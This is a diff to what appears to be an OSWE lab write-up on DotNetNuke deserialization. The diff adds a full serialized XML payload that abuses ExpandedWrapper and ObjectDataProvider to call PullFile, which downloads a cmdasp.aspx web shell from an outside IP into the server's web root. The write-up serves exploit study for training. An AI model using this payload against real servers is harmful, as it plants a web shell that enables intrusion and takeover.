@@ -267,6 +267,11 @@ To address the serialization issue, Muñoz and Mirosh proposed using the `Expand
 
 Let's see how that looks in practice: https://github.com/solimanalmansor/OSWE-Prep/blob/main/OSWE-Labs/DotNetNuke/ExpWrap/ExpWrapSerializer.cs
 
-beginning at line `[18](https://github.com/solimanalmansor/OSWE-Prep/blob/main/OSWE-Labs/DotNetNuke/ExpWrap/ExpWrapSerializer.cs#L18)`, we see that instead of using the `ObjectDataProvider` directly, an instance of `ExpandedWrapper<FileSystemUtils, ObjectDataProvider>` is created. The `ProjectedProperty0` property is then used to assign a new `ObjectDataProvider` instance. The rest of the code remains largely unchanged.
+beginning at line `18`, we see that instead of using the `ObjectDataProvider` directly, an instance of `ExpandedWrapper<FileSystemUtils, ObjectDataProvider>` is created. The `ProjectedProperty0` property is then used to assign a new `ObjectDataProvider` instance. The rest of the code remains largely unchanged.
 
 When this code is compiled and executed, it runs without errors, and the web server successfully processes the corresponding HTTP request—**confirming that the payload was correctly serialized and executed**.
+
+The serialized object now looks like this:
+```xml
+<profile><item key="myTableEntry" type="System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils, DotNetNuke, Version=9.1.0.367, Culture=neutral, PublicKeyToken=null],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"><ExpandedWrapperOfFileSystemUtilsObjectDataProvider xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><ProjectedProperty0><ObjectInstance xsi:type="FileSystemUtils" /><MethodName>PullFile</MethodName><MethodParameters><anyType xsi:type="xsd:string">http://192.168.45.192/cmdasp.aspx</anyType><anyType xsi:type="xsd:string">C:/inetpub/wwwroot/dotnetnuke/cmdasp.aspx</anyType></MethodParameters></ProjectedProperty0></ExpandedWrapperOfFileSystemUtilsObjectDataProvider></item></profile>
+```
